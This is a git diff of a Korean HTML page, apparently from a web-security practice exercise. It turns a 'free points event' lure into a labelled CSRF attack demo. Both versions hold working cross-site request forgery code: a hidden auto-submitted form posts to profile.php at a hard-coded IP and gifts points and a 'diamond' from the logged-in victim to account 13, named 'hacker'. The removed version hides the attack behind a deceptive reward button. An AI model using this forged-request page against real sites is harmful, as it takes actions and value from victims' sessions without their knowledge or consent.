@@ -2,7 +2,7 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🎁 포인트 받기</title>
+    <title>🎁 포인트 이벤트</title>
     <style>
         body { 
             font-family: Arial; 
@@ -11,57 +11,125 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
         }
+        .step {
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            margin: 20px;
+            border-radius: 15px;
+        }
         button {
-            padding: 20px 40px;
-            font-size: 18px;
+            padding: 15px 30px;
+            font-size: 16px;
             background: #FF6B6B;
             color: white;
             border: none;
             border-radius: 10px;
             cursor: pointer;
+            margin: 10px;
         }
+        .success { background: #00FF88; }
+        .warning { background: #FFB347; }
     </style>
 </head>
 <body>
-    <h1>🎁 무료 포인트 이벤트!</h1>
-    <p>아래 버튼을 클릭하면 100 포인트를 받을 수 있습니다!</p>
+    <div class="step">
+        <h1>🎁 실제 CSRF 공격 시연</h1>
+        <p><strong>⚠️ 중요:</strong> CSRF 공격은 피해자가 이미 로그인된 상태에서만 성공합니다!</p>
+    </div>
+
+    <div class="step">
+        <h2>📋 1단계: 피해자 로그인 시뮬레이션</h2>
+        <p>실제 상황에서는 피해자가 이미 로그인되어 있습니다</p>
+        <button onclick="openLoginPage()">🔐 먼저 로그인하기</button>
+        <p style="font-size: 0.9em;">↑ 새 탭에서 로그인 완료 후 이 탭으로 돌아오세요</p>
+    </div>
+
+    <div class="step">
+        <h2>⚡ 2단계: CSRF 공격 실행</h2>
+        <p>로그인 완료 후 아래 버튼을 클릭하세요</p>
+        <button class="success" onclick="executeCSRF()">🚀 공격 실행 (로그인 후)</button>
+        <div id="attackResult"></div>
+    </div>
+
+    <div class="step">
+        <h2>🔍 3단계: 결과 확인</h2>
+        <button class="warning" onclick="checkResult()">📊 결과 확인하기</button>
+    </div>
+
+    <div class="step">
+        <h2>💡 교육 목적 설명</h2>
+        <p><strong>CSRF 공격이 위험한 이유:</strong></p>
+        <ul style="text-align: left; max-width: 600px; margin: 0 auto;">
+            <li>사용자가 이미 로그인된 사이트에서 발생</li>
+            <li>사용자 모르게 악의적인 요청 전송</li>
+            <li>브라우저가 자동으로 쿠키/세션 포함해서 전송</li>
+            <li>사용자는 공격당한 사실을 모름</li>
+        </ul>
+    </div>
+
+    <!-- 실제 공격 Form (숨김) -->
+    <form id="csrfForm" method="POST" action="http://3.36.66.216/profile.php" target="attackFrame" style="display: none;">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="points" value="100">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="gift_type" value="diamond">
+        <input type="hidden" name="message" value="CSRF_Attack_With_Session">
+    </form>
     
-    <button onclick="attack()">🎉 포인트 받기!</button>
-    
-    <div id="result"></div>
-    
+    <iframe name="attackFrame" style="display: none;"></iframe>
+
     <script>
-        function attack() {
-            // Form 생성 및 전송
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'http://3.36.66.216/profile.php';
-            form.target = '_blank';
+        let loginWindow = null;
+        
+        function openLoginPage() {
+            console.log('🔐 로그인 페이지 열기');
+            loginWindow = window.open('http://3.36.66.216/login.php', 'loginPage', 'width=800,height=600');
             
-            const data = {
-                receiver_id: '13',
-                points: '100', 
-                send_gift: '1',
-                gift_type: 'diamond',
-                message: 'MANUAL_CSRF'
-            };
-            
-            for (let key in data) {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = data[key];
-                form.appendChild(input);
-            }
-            
-            document.body.appendChild(form);
-            form.submit();
-            document.body.removeChild(form);
-            
-            document.getElementById('result').innerHTML = 
-                '<p style="color: lime;">✅ 포인트 전송 완료!</p>' +
-                '<p><a href="http://3.36.66.216" target="_blank">결과 확인하기 →</a></p>';
+            // 로그인 창 모니터링
+            const checkLogin = setInterval(() => {
+                if (loginWindow.closed) {
+                    clearInterval(checkLogin);
+                    alert('💡 로그인이 완료되었다면 "공격 실행" 버튼을 클릭하세요!');
+                }
+            }, 1000);
         }
+        
+        function executeCSRF() {
+            console.log('🚀 CSRF 공격 실행');
+            
+            // 공격 실행 애니메이션
+            const result = document.getElementById('attackResult');
+            result.innerHTML = '<p style="color: yellow;">⏳ 공격 실행 중...</p>';
+            
+            // 실제 공격 전송
+            setTimeout(() => {
+                document.getElementById('csrfForm').submit();
+                console.log('📤 CSRF 공격 전송됨');
+                
+                result.innerHTML = `
+                    <div style="background: rgba(0,255,0,0.2); padding: 15px; border-radius: 10px; margin: 15px 0;">
+                        <p style="color: lime;"><strong>✅ 공격 전송 완료!</strong></p>
+                        <p>타겟: hacker (ID: 13)</p>
+                        <p>전송 포인트: 100P</p>
+                        <p>메시지: CSRF_Attack_With_Session</p>
+                    </div>
+                `;
+            }, 1500);
+        }
+        
+        function checkResult() {
+            console.log('🔍 결과 확인');
+            window.open('http://3.36.66.216', 'resultPage', 'width=800,height=600');
+        }
+        
+        // 페이지 로드 시 안내
+        window.addEventListener('load', function() {
+            console.log('🎯 CSRF 공격 데모 준비됨');
+            console.log('📋 단계별 진행 필요:');
+            console.log('1. 먼저 로그인');
+            console.log('2. 공격 실행');
+            console.log('3. 결과 확인');
+        });
     </script>
 </body>
 </html>
